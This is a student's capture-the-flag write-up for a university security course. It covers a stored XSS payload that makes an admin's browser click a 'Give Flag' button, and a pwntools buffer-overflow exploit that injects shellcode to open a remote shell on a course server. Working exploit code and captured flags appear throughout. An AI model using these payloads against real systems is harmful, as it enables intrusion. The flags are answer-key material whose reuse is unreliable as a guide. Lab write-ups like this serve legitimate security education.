# Trabalho Realizado na Semana 5

## CTF

### Desafio 1

For this challenge, after we send a justification, we go to a page where the admin can give the flag and mark the request as read. These buttons are only enbaled to the admin so our purpose is to make the admin click the button `Give Flag` for us. For that, we can use the justification: `<script>document.getElementById('giveflag').click()</script>`, which will try to click the button everytime someone enters the page.

When the admin goes to evaluate the request, the script will click the button, and as it will be enabled, the flag will be given to us.

Flag:
```
flag{754649a1f0ffcd9943a6fafb3ca59853}
```

### Desafio 2

This is a simple shellcode execution attack. We have a buffer of 100 bytes, which is large enough to store our shellcode, and the program prints the buffer base address, which we can use as return address.

The smplified payload would be: `shellcode + trash + buffer address`

To get the return address offset, we used the following python script:

```py
from pwn import *

context.update(arch='i386', os='linux')

p = process("./program")
gdb.attach(p)
pause()

p.sendline(cyclic(150))
p.interactive()
```

From this, the program crashes at `daab`. Using this value in the function `cyclic_find` we get the offset, which is 112.

With the offset, we can now build our script to open the shell on the server:

```py
from pwn import *

context.update(arch='i386', os='linux')

LOCAL = False

if LOCAL:
    p = process("./program")
    gdb.attach(p)
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4001)

p.recvuntil(b"Your buffer is ")
buffer = p.recvuntil(b".")[:-1]
buffer = (int(buffer, 16))

shellcode = shellcraft.sh()
shellcode = asm(shellcode)

payload = shellcode + b'\x00' * (cyclic_find('daab') - len(shellcode) - 4)
payload += p32(buffer)

p.sendline(payload)
p.interactive()
```

This successfully opens a shell in the server, and using the command `cat flag.txt` we get the flag.

Flag:
```
flag{5155603df944885d37463ad476a1accd}
```

---

